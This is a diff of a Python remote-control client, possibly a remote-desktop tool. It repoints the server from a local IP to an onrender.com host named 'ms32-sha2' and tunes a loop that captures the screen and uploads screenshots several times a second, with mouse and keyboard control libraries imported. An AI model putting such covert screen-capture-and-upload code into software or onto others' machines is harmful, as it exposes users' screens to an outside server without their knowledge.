@@ -14,15 +14,12 @@ from mouse import move, click, wheel, double_click
 from io import BytesIO
 import time 
 import httpx
-import asyncio
-import aiohttp
 import keyboard
-from pyautogui import size 
-import pyautogui
+from pyautogui import size
 from mss import mss
 import pynput
 url = "https://ms32-sha2.onrender.com/"
-url = "http://192.168.9.115:5000/"
+# url = "http://192.168.9.115:5000/"
 screen = rs.get_primary_display()
 terminate = False
 sstate = False
@@ -320,12 +317,12 @@ def share():
                     (ss.width, ss.height), 
                     ss.rgb)
                 buffer = BytesIO()
-                img.save(buffer,format="JPEG")
+                img.save(buffer,format="JPEG",quality=70)
                 buffer.seek(0)
                 rq.post(url+"screenshot", data=buffer.read())
                 elapsed_time = time.time() - start_time
                 fps = 1 / elapsed_time if elapsed_time > 0 else 0
-                # print(f"FPS: {fps:.2f}")
+                print(f"FPS: {fps:.2f}")
                 fps_delay = max(0, 1/5 - elapsed_time)
                 sleep(fps_delay)
             except httpx.ConnectTimeout:continue
